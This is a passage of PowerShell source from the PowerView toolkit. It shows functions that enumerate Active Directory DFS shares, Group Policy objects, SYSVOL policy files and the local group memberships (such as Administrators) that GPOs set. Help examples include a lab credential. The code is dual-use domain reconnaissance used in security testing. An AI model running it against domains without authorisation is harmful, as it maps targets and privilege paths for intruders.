                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}

function Get-GptTmpl {
<#
.SYNOPSIS

Helper to parse a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATH\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing | Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}

function Get-GroupsXML {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # extract the localgroup sid for memberof
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # extract out members added to this group
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # extract out any/all filters...I hate you GPP
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}

function Get-DomainGPO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | Get-DomainGPO

Return the GPOs with the name of "{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display
name of "Test GPO"

.EXAMPLE

Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPO -Credential $Cred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # find all the GPOs linked to the user/computer's OUs
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as "enforced"
                                            #   then add it, otherwise ignore it
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # find all the GPOs linked to the computer's site
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer's domain
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # restore the old properites to return, if set
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}

function Get-DomainGPOLocalGroup {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups'
or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO with the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup 'Desktops'

Return any GPO-set groups for the GPO with the given display name.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOLocalGroup -Credential $Cred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # parse the members/memberof fields for each entry
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # extract out ALL members
